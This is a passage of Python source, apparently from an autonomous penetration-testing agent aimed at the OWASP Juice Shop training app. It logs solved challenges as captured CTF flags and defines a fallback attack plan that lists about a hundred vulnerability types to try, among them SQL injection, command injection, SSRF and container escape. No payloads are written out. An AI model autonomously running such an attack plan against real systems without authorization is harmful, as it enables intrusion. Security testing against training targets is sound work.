            challenge_name = c.get("name", f"Challenge #{cid}")
            category = c.get("category", "unknown")
            difficulty = c.get("difficulty", 0)

            flag_value = f"SOLVED: {challenge_name} [{category}] (difficulty: {difficulty})"
            await self._log_callback("info", f"[CTF] CHALLENGE SOLVED: {challenge_name} ({category}, difficulty {difficulty})")

            # Register as a captured flag
            if self.flag_detector and flag_value not in self.flag_detector._seen_flags:
                import time
                from backend.core.ctf_flag_detector import CapturedFlag
                captured = CapturedFlag(
                    flag_value=flag_value,
                    platform="juice_shop",
                    source="challenge_api",
                    found_in_url=f"{self.target}/api/Challenges",
                    found_in_field=f"challenge_id={cid}",
                    request_method="GET",
                    request_payload="",
                    timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                )
                self.flag_detector._seen_flags.add(flag_value)
                self.flag_detector.captured_flags.append(captured)
                if self.flag_detector.first_flag_time is None:
                    self.flag_detector.first_flag_time = time.time()
                self.flag_detector._flag_timeline.append({
                    "flag": flag_value[:80],
                    "platform": "juice_shop",
                    "elapsed_seconds": round(time.time() - self.flag_detector.start_time, 2),
                })

            # Update baseline so we don't count it again
            self._baseline_solved.add(cid)

        if newly_solved:
            await self._log_callback("info", f"[CTF] {len(newly_solved)} new challenge(s) solved during {phase_name} phase!")

    @staticmethod
    def _static_default_attack_plan() -> List[str]:
        """Fallback vuln type list (same order as AutonomousAgent._default_attack_plan)."""
        return [
            "sqli_error", "sqli_union", "command_injection", "ssti",
            "auth_bypass", "insecure_deserialization", "rfi", "file_upload",
            "xss_reflected", "xss_stored", "lfi", "ssrf", "ssrf_cloud",
            "xxe", "path_traversal", "idor", "bola",
            "sqli_blind", "sqli_time", "jwt_manipulation",
            "privilege_escalation", "arbitrary_file_read",
            "nosql_injection", "ldap_injection", "xpath_injection",
            "blind_xss", "xss_dom", "cors_misconfig", "csrf",
            "open_redirect", "session_fixation", "bfla",
            "mass_assignment", "race_condition", "host_header_injection",
            "http_smuggling", "subdomain_takeover",
            "security_headers", "clickjacking", "http_methods", "ssl_issues",
            "directory_listing", "debug_mode", "exposed_admin_panel",
            "exposed_api_docs", "insecure_cookie_flags",
            "sensitive_data_exposure", "information_disclosure",
            "api_key_exposure", "version_disclosure",
            "crlf_injection", "header_injection", "prototype_pollution",
            "graphql_introspection", "graphql_dos", "graphql_injection",
            "cache_poisoning", "parameter_pollution", "type_juggling",
            "business_logic", "rate_limit_bypass", "timing_attack",
            "weak_encryption", "weak_hashing", "cleartext_transmission",
            "vulnerable_dependency", "s3_bucket_misconfiguration",
            "cloud_metadata_exposure", "soap_injection",
            "source_code_disclosure", "backup_file_exposure",
            "csv_injection", "html_injection", "log_injection",
            "email_injection", "expression_language_injection",
            "mutation_xss", "dom_clobbering", "postmessage_vulnerability",
            "websocket_hijacking", "css_injection", "tabnabbing",
            "default_credentials", "weak_password", "brute_force",
            "two_factor_bypass", "oauth_misconfiguration",
            "forced_browsing", "arbitrary_file_delete", "zip_slip",
            "orm_injection", "improper_error_handling",
            "weak_random", "insecure_cdn", "outdated_component",
            "container_escape", "serverless_misconfiguration",
            "rest_api_versioning", "api_rate_limiting",
            "excessive_data_exposure",
        ]
